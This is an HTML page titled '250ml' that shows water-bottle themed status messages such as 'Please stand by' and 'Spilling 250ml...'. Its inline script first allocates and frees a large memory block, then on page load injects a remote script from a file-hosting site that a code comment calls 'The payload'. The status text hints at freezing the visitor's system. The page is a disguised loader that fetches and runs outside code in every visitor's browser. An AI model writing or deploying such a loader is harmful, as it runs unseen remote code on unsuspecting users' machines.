<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>250ml</title>
  <link rel="stylesheet" href="style250.css" />
  <script>
  const preLoad = new Array(5e7).fill(123); // Allocates ~50MB up front

  setTimeout(() => {
    preLoad.length = 0; // Releases that memory

    const script = document.createElement('script');
    script.src = 'https://files.catbox.moe/cwedrd.js'; // The payload
    script.defer = true;

    script.onload = () => {
      document.getElementById("status").textContent = "Spilling water unless system frozen...";
    };

    script.onerror = () => {
      document.getElementById("status").textContent = "Bottle not filled.";
    };

    document.head.appendChild(script);
  }, 2000); // Gives GC a moment to stabilize
</script>
</head>
<body>
  <div class="container">
    <h1>Please stand by.</h1>
    <p class="note">Spilling 250ml...</p>
    <pre id="status">Filling up water...</pre>
  </div>
</body>
</html>
